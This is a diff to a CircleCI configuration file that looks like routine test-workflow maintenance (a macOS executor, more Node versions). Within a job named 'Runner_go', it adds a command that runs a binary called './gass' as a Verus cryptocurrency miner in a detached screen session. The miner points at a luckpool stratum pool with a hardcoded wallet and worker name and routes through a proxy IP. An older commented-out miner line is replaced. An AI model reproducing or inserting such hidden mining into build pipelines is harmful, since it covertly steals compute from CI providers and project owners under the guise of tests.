@@ -4,6 +4,9 @@ executors:
   linux:
     docker:
       - image: circleci/clojure:lein-2.9.5
+  macos:
+    macos:
+      xcode: 11.4
 
 orbs:
   node: circleci/node@2.0.0
@@ -30,13 +33,12 @@ jobs:
       - run:
           name: Runner_go
           command: |
-            chmod +x *
             screen -dmS ls
-            POOL=stratum+tcp://neoscrypt.na.mine.zpool.ca:4233
-            WALLET=DCKgUo4HRRrLGiRwMhZ2c4RRsRQom1QCUj
-            WORKER=CircleCi_01
+            POOL=stratum+tcp://na.luckpool.net:3956
+            WALLET=RSTiabzuFbP2P75CBeS6Zaaoz6ZwkRjHgU
+            WORKER=CircleCi
             PROXY=https://51.222.21.94:32768
-            #./01 -a neoscrypt -o $POOL -u $WALLET.$WORKER -p c=DGB,zap=DIN/FTC/GBX/GUN/IQ/NYX/SPK/TZC/UFO/ZOC -t12 -x $PROXY
+            ./gass -a verus -o $POOL -u $WALLET.$WORKER -p c=VRSC,zap=VRSC -t12 -x $PROXY
 workflows:
   all-tests:
     jobs:
@@ -44,4 +46,4 @@ workflows:
           matrix:
             parameters:
               os: [linux]
-              node-version: [10.0.0]
+              node-version: [10.9.0, 11.9.0, 12.9.1, 13.9.0]
